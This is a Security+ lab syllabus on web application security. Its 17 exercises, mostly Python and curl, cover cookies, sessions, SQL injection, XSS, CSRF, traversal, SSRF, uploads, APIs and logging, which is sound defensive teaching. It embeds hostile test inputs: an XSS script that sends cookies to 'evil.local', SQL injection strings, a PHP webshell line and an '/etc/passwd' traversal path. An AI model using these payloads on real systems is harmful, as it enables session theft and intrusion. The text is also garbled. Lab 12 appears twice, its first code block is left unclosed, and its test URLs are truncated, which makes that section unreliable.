# Part 3 – Practical Security+ Laboratory Syllabus
## Module 4: Web and Application Security

> **Lab Environment:** Linux/Windows/macOS Terminal, Python 3 (`sqlite3`, `html`, `http.server`, `urllib`, `hmac`, `secrets`, `os`, `json`), `curl`, `openssl`, Browser DevTools (`F12`).  
> **Safety Best Practice:** Execute all offensive/defensive tests strictly against `127.0.0.1` local lab scripts.

---

### Lab 1: HTTP and HTTPS (Transport Encryption & Security Headers)
* **Objective:** Contrast cleartext HTTP against encrypted HTTPS (`TLS 1.3`) and inspect critical HTTP security response headers (`Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`).
* **Hands-On Steps:**
  ```bash
  # 1. Inspect TLS 1.3 protocol negotiation and server certificate chain
  openssl s_client -connect example.com:443 -tls1_3 </dev/null 2>/dev/null | \
    grep -E "Protocol|Cipher|Verification:"

  # 2. Fetch and inspect HTTP response headers via curl
  curl -sI https://example.com | grep -iE "HTTP/|Content-Type|Strict-Transport|Content-Security|X-Frame"
  ```

---

### Lab 2: Request and Response Analysis
* **Objective:** Dissect raw HTTP request verbs (`GET`, `POST`, `PUT`, `DELETE`, `OPTIONS`), request headers (`Host`, `User-Agent`, `Authorization`, `Cookie`), and HTTP status codes (`200`, `301`, `401`, `403`, `404`, `500`).
* **Hands-On Steps:**
  ```bash
  # Send a verbose HTTP request (-v) to observe full TLS handshake, request headers, and response headers
  curl -v -X GET "https://example.com" -H "X-Lab-Tester: SecPlus" -o /dev/null 2>&1 | \
    grep -E "^> |^< "
  ```

---

### Lab 3: Cookies (Security Attributes & Flag Auditing)
* **Objective:** Enforce `Secure`, `HttpOnly`, and `SameSite=Strict` cookie attributes to protect session identifiers from network sniffing, XSS theft, and CSRF.
* **Hands-On Steps (Run Cookie Security Auditor in Python):**
  ```python
  headers = [
      "Set-Cookie: session_id=9f8e7d6c5b4a; Path=/; Secure; HttpOnly; SameSite=Strict",
      "Set-Cookie: session_id=1a2b3c4d5e6f; Path=/"
  ]

  for h in headers:
      flags = [f for f in ["Secure", "HttpOnly", "SameSite=Strict"] if f.lower() not in h.lower()]
      status = "SECURE [OK]" if not flags else f"VULNERABLE [!] Missing: {', '.join(flags)}"
      print(f"{h}\n  -> {status}\n")
  ```

---

### Lab 4: Sessions (Generation, Expiration & Session Fixation Defense)
* **Objective:** Generate cryptographically random session tokens (`secrets.token_urlsafe`), enforce idle/absolute timeouts, and regenerate session IDs immediately upon login to prevent **Session Fixation**.
* **Hands-On Steps:**
  ```python
  import secrets, time

  def create_session(user_id):
      return {
          "session_token": secrets.token_urlsafe(32),  # 256 bits of CSPRNG entropy
          "user_id": user_id,
          "expires_at": time.time() + 900              # 15-minute strict timeout
      }

  session = create_session("ambe.fon")
  print("Hardened Session Object:", session)
  ```

---

### Lab 5: Authentication (Salted Password Hashing & Uniform Error Handling)
* **Objective:** Store passwords using salted key-stretching (`PBKDF2-HMAC-SHA256`) and return uniform login error messages to prevent **User Enumeration**.
* **Hands-On Steps:**
  ```python
  import hashlib, os, hmac

  salt = os.urandom(16)
  stored_hash = hashlib.pbkdf2_hmac("sha256", b"BueaMountain2026!", salt, 200_000)

  def verify_login(candidate_password):
      candidate_hash = hashlib.pbkdf2_hmac("sha256", candidate_password.encode(), salt, 200_000)
      # Constant-time comparison prevents timing side-channel attacks
      if hmac.compare_digest(stored_hash, candidate_hash):
          return "200 OK: Authenticated"
      return "401 Unauthorized: Invalid username or password"

  print(verify_login("WrongPass"))
  print(verify_login("BueaMountain2026!"))
  ```

---

### Lab 6: Authorization (Preventing IDOR & Broken Access Control)
* **Objective:** Enforce server-side object ownership and Role-Based Access Control (RBAC) checks on every request to block **Insecure Direct Object References (IDOR)** and vertical privilege escalation.
* **Hands-On Steps:**
  ```python
  records_db = {
      1001: {"owner": "alice", "balance": "$12,400"},
      1002: {"owner": "ambe",  "balance": "$48,900"}
  }

  def get_account_record(authenticated_user, user_role, record_id):
      record = records_db.get(record_id)
      if not record:
          return "404 Not Found"
      if record["owner"] != authenticated_user and user_role != "admin":
          return "403 Forbidden [IDOR BLOCKED]: You do not own this record."
      return f"200 OK: {record}"

  print(get_account_record("alice", "user", 1002))
  print(get_account_record("ambe",  "user", 1002))
  ```

---

### Lab 7: Input Validation (Server-Side Allow-Listing)
* **Objective:** Reject unexpected characters, lengths, and data types on the server before passing inputs to business logic or interpreters.
* **Hands-On Steps:**
  ```python
  import re

  def validate_order_id(order_id):
      if not re.fullmatch(r"^ORD-\d{6}$", str(order_id)):
          raise ValueError(f"Rejected malformed input: {order_id!r}")
      return f"Accepted: {order_id}"

  print(validate_order_id("ORD-482910"))
  try:
      validate_order_id("ORD-482910; DROP TABLE orders;--")
  except ValueError as err:
      print("[BLOCKED]", err)
  ```

---

### Lab 8: SQL Injection Concepts (Vulnerable vs. Parameterized Queries)
* **Objective:** Observe how unescaped SQL string concatenation allows authentication bypass, and eliminate it using **Parameterized Queries (Prepared Statements)**.
* **Hands-On Steps:**
  ```python
  import sqlite3

  conn = sqlite3.connect(":memory:")
  cur = conn.cursor()
  cur.execute("CREATE TABLE users (username TEXT, role TEXT)")
  cur.execute("INSERT INTO users VALUES ('admin', 'superuser'), ('guest', 'viewer')")

  payload = "' OR '1'='1"

  # VULNERABLE: String concatenation alters SQL syntax tree
  vuln_rows = cur.execute(f"SELECT username, role FROM users WHERE username = '{payload}'").fetchall()
  print("Vulnerable Query Returned :", vuln_rows)

  # SECURE: Parameterized placeholder (?) binds payload strictly as a literal string
  safe_rows = cur.execute("SELECT username, role FROM users WHERE username = ?", (payload,)).fetchall()
  print("Parameterized Query Result:", safe_rows)
  ```

---

### Lab 9: Cross-Site Scripting (XSS — Context-Aware Output Encoding)
* **Objective:** Prevent Reflected and Stored XSS by HTML-encoding untrusted user input (`<`, `>`, `&`, `"`, `'`) before rendering it inside web pages.
* **Hands-On Steps:**
  ```python
  import html

  untrusted_comment = '<script>fetch("http://evil.local" + document.cookie)</script>'

  # Context-aware HTML entity encoding neutralizes executable script tags
  safe_rendered_html = f"<div class='comment'>{html.escape(untrusted_comment, quote=True)}</div>"
  print("Safe Encoded HTML Output:\n ", safe_rendered_html)
  ```

---

### Lab 10: Cross-Site Request Forgery (CSRF — Anti-CSRF Tokens)
* **Objective:** Protect state-changing `POST` endpoints using cryptographically bound per-session **Anti-CSRF Tokens** combined with `SameSite=Strict` cookies.
* **Hands-On Steps:**
  ```python
  import secrets, hmac

  session_csrf_token = secrets.token_hex(32)

  def process_transfer(submitted_csrf_token):
      if not hmac.compare_digest(session_csrf_token, submitted_csrf_token):
          return "403 Forbidden [CSRF BLOCKED]: Invalid or missing Anti-CSRF token!"
      return "200 OK: Transfer authorized."

  print("Cross-Site Forged Request:", process_transfer("forged_attacker_token"))
  print("Legitimate Form Submit   :", process_transfer(session_csrf_token))
  ```

---

### Lab 11: Directory Traversal (Path Canonicalization)
* **Objective:** Prevent `../` path traversal attacks by resolving the canonical absolute path (`os.path.realpath`) and verifying it stays strictly inside the permitted base directory.
* **Hands-On Steps:**
  ```python
  import os

  BASE_DIR = "/var/www/app/public_docs"

  def safe_read_path(requested_filename):
      candidate_path = os.path.realpath(os.path.join(BASE_DIR, requested_filename))
      if not candidate_path.startswith(BASE_DIR + os.sep):
          return f"[403 BLOCKED - DIRECTORY TRAVERSAL] Escaped web root: {candidate_path}"
      return f"[200 OK] Resolved safe path: {candidate_path}"

  print(safe_read_path("../../../../etc/passwd"))
  print(safe_read_path("reports/annual_2026.pdf"))
  ```

---

### Lab 12: Server-Side Request Forgery (SSRF)
* **Objective:** Block backend URL-fetching features from accessing loopback interfaces (`127.0.0.1`), private RFC 1918 subnets (`10.0.0.0/8`), or cloud metadata endpoints (`169.254.169.254`).
* **Hands-On Steps:**
  ```python
  import ipaddress, socket
  from urllib.parse import urlparse

  def validate_outbound_url(target_url):
      parsed = urlparse(target_url)
      if parsed.scheme not in {"http", "https"}:
          return "[SSRF BLOCKED] Only HTTP/HTTPS schemes allowed."
      ip_obj = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
      if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
          return f"[SSRF BLOCKED] Target resolves to restricted internal/metadata IP ({ip_obj})!"
      return f"[ALLOWED] External IP {ip_obj} cleared."

### Lab 12: Server-Side Request Forgery (SSRF)
* **Objective:** Block backend URL-fetching features (webhooks, image importers, PDF generators) from accessing loopback interfaces (`127.0.0.1` / `::1`), private RFC 1918 internal subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), or cloud instance metadata endpoints (`169.254.169.254`).
* **Hands-On Steps (Build a DNS-Resolving SSRF Blocker in Python):**
  ```python
  import ipaddress
  import socket
  from urllib.parse import urlparse

  def validate_outbound_url(target_url):
      parsed = urlparse(target_url)
      if parsed.scheme not in {"http", "https"} or not parsed.hostname:
          return "[SSRF BLOCKED] Only valid HTTP/HTTPS URLs are permitted."

      try:
          # Resolve hostname to IP address first (defeats DNS rebinding / hex IP tricks)
          resolved_ip = socket.gethostbyname(parsed.hostname)
          ip_obj = ipaddress.ip_address(resolved_ip)
      except socket.gaierror:
          return f"[SSRF BLOCKED] Unable to resolve hostname: {parsed.hostname}"

      if (
          ip_obj.is_private
          or ip_obj.is_loopback
          or ip_obj.is_link_local
          or ip_obj.is_reserved
          or ip_obj.is_multicast
      ):
          return f"[SSRF BLOCKED] '{target_url}' resolves to restricted internal/metadata IP ({ip_obj})!"

      return f"[ALLOWED] External IP {ip_obj} cleared for outbound request."

  print(validate_outbound_url("http://169.254.169"))
  print(validate_outbound_url("http://127.0.0"))
  print(validate_outbound_url("https://example.com"))
  ```

---

### Lab 13: File Upload Security
* **Objective:** Harden file upload endpoints against webshells (`shell.php`), double-extension bypasses (`payload.php.png`), and oversized DoS uploads by enforcing **strict extension allow-listing**, **file magic-byte signature verification**, **file size limits**, **UUID filename randomization**, and **non-executable storage outside the web root**.
* **Hands-On Steps (Run a Multi-Layer File Upload Validator in Python):**
  ```python
  import os
  import uuid

  MAX_UPLOAD_BYTES = 5 * 1024 * 1024  # 5 MB cap

  MAGIC_SIGNATURES = {
      ".png": b"\x89PNG\r\n\x1a\n",
      ".jpg": b"\xff\xd8\xff",
      ".pdf": b"%PDF-"
  }

  def validate_upload(original_filename, file_bytes):
      if len(file_bytes) > MAX_UPLOAD_BYTES:
          return "[UPLOAD BLOCKED] File exceeds maximum 5MB size limit."

      # Extract final extension and reject double extensions like shell.php.png
      lower_name = original_filename.lower()
      if any(bad in lower_name for bad in [".php", ".exe", ".sh", ".jsp", ".aspx"]):
          return f"[UPLOAD BLOCKED] Dangerous executable extension detected in '{original_filename}'!"

      ext = os.path.splitext(lower_name)[1]
      if ext not in MAGIC_SIGNATURES:
          return f"[UPLOAD BLOCKED] Extension '{ext}' is not on the allow-list."

      # Inspect actual file header bytes (Magic Numbers) rather than trusting Content-Type
      if not file_bytes.startswith(MAGIC_SIGNATURES[ext]):
          return f"[UPLOAD BLOCKED] File content does not match {ext.upper()} magic bytes!"

      # Rename with random UUID so attacker cannot guess or traverse uploaded path
      safe_filename = f"{uuid.uuid4()}{ext}"
      return f"[UPLOAD ACCEPTED] Stored safely outside web root as '{safe_filename}'."

  print(validate_upload("webshell.php.png", b"<?php system($_GET['cmd']); ?>"))
  print(validate_upload("receipt.pdf",      b"%PDF-1.7\n%Valid_PDF_Stream"))
  ```

---

### Lab 14: API Security (Authentication, Rate Limiting & Data Exposure Control)
* **Objective:** Protect REST APIs against **Broken Object Level Authorization (BOLA)**, **Excessive Data Exposure** (returning full database objects including password hashes), and brute-force/scraping abuse using scoped **Bearer Tokens**, **response DTO filtering**, and **sliding-window rate limiting**.
* **Hands-On Steps (Build a Hardened API Gateway Handler in Python):**
  ```python
  import time
  import hmac

  VALID_API_TOKENS = {"tok_secplus_live_9918273645": {"client": "MobileApp_v2", "role": "reader"}}
  request_history = {}

  def handle_api_request(auth_header, client_ip, raw_user_record):
      # 1. Sliding-Window Rate Limiter (Max 3 requests per 10 seconds per IP)
      now = time.time()
      recent = [t for t in request_history.get(client_ip, []) if now - t < 10]
      if len(recent) >= 3:
          return "429 Too Many Requests [API RATE LIMIT EXCEEDED]"
      recent.append(now)
      request_history[client_ip] = recent

      # 2. Constant-Time Bearer Token Validation
      token = auth_header.replace("Bearer ", "") if auth_header.startswith("Bearer ") else ""
      matched_client = None
      for valid_tok, meta in VALID_API_TOKENS.items():
          if hmac.compare_digest(token, valid_tok):
              matched_client = meta
      if not matched_client:
          return "401 Unauthorized: Invalid API Bearer Token"

      # 3. Prevent Excessive Data Exposure: Return ONLY safe public fields (strip password_hash & mfa_secret)
      safe_dto = {k: v for k, v in raw_user_record.items() if k in {"user_id", "username", "tier"}}
      return f"200 OK ({matched_client['client']}): {safe_dto}"

  db_user = {"user_id": 401, "username": "ambe.fon", "tier": "Gold", "password_hash": "pbkdf2$...", "mfa_secret": "JBSWY3DPEHPK3PXP"}

  print(handle_api_request("Bearer wrong_token", "198.51.100.10", db_user))
  print(handle_api_request("Bearer tok_secplus_live_9918273645", "198.51.100.10", db_user))
  ```

---

### Lab 15: Secure Coding (Static Analysis & Defense-in-Depth Patterns)
* **Objective:** Audit Python application code using static Abstract Syntax Tree (`ast`) inspection to detect dangerous sinks (`eval`, `exec`, `pickle.loads`, `subprocess(..., shell=True)`, weak `md5`/`sha1` hashes) before code reaches production.
* **Hands-On Steps (Run a Custom Python SAST Security Scanner):**
  ```python
  import ast

  sample_app_code = """
  import hashlib, subprocess

  def bad_hash(pw):
      return hashlib.md5(pw.encode()).hexdigest()

  def bad_exec(user_arg):
      subprocess.run("ls " + user_arg, shell=True)
  """

  tree = ast.parse(sample_app_code)
  for node in ast.walk(tree):
      if isinstance(node, ast.Attribute) and node.attr in {"md5", "sha1"}:
          print(f"[SAST MEDIUM] Weak cryptographic hash '{node.attr}()' detected at line {node.lineno}!")
      if isinstance(node, ast.Call):
          for kw in node.keywords:
              if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                  print(f"[SAST CRITICAL] Command Injection risk: 'shell=True' detected at line {node.lineno}!")
  ```

---

### Lab 16: Dependency Security (Software Composition Analysis — SCA)
* **Objective:** Generate a reproducible **Software Bill of Materials (SBOM)** / pinned dependency lockfile (`requirements.txt`), verify package hashes, and audit third-party libraries for known CVEs or supply-chain risks (typosquatting / unmaintained packages).
* **Hands-On Steps:**
  ```bash
  mkdir -p ~/webapp_sec_lab && cd ~/webapp_sec_lab

  # 1. Export exact pinned versions of all installed Python packages
  pip freeze > requirements.lock
  head -n 15 requirements.lock

  # 2. Check for outdated packages that may be missing upstream security fixes
  pip list --outdated 2>/dev/null | head -n 10
  ```

---

### Lab 17: Application Logging (Structured JSON Security Audit Logs & Log Injection Prevention)
* **Objective:** Emit machine-parseable **JSON** security logs for SIEM ingestion (`AUTH_SUCCESS`, `AUTH_FAILURE`, `IDOR_BLOCKED`, `SSRF_BLOCKED`) while enforcing **Log Sanitization** (stripping `\n` / `\r` newlines to prevent **Log Forging / CRLF Injection**) and **Secret Redaction** (never logging passwords, session tokens, or API keys).
* **Hands-On Steps (Build a Tamper-Resistant Structured JSON Security Logger in Python):**
  ```python
  import json
  from datetime import datetime, timezone

  def sanitize_log_field(value):
      # Strip newline/carriage-return characters to prevent CRLF Log Injection / Forging
      return str(value).replace("\n", "\\n").replace("\r", "\\r")

  def emit_app_security_log(event_type, outcome, username, src_ip, extra_detail=""):
      log_record = {
          "timestamp_utc": datetime.now(timezone.utc).isoformat(),
          "app_name": "SecPlus-Portal",
          "event_type": sanitize_log_field(event_type),
          "outcome": sanitize_log_field(outcome),
          "username": sanitize_log_field(username),
          "source_ip": sanitize_log_field(src_ip),
          "detail": sanitize_log_field(extra_detail)
      }
      print(json.dumps(log_record))

  # Test normal event and a simulated CRLF Log Injection attempt
  emit_app_security_log("LOGIN_ATTEMPT", "FAILURE", "admin\n2026-11-21T14:42:00Z LOGIN_ATTEMPT SUCCESS", "203.0.113.55", "Invalid password")
  ```

---

### Module 4 Lab Completion Checklist
- [ ] Inspected live **TLS 1.3** handshakes and **HTTP Security Headers** (`curl -v -I`, `openssl s_client`).
- [ ] Implemented hardened **Cookies (`Secure`, `HttpOnly`, `SameSite=Strict`)**, **CSPRNG Sessions**, **Salted PBKDF2 Authentication**, and **IDOR Authorization checks**.
- [ ] Built Python defenses against **SQL Injection (Parameterized Queries)**, **XSS (`html.escape`)**, **CSRF Tokens**, and **Directory Traversal (`realpath`)**.
- [ ] Implemented DNS-resolving **SSRF** blocking, magic-byte **File Upload** validation, **API Rate Limiting + DTO filtering**, and **Python AST SAST** scanning.
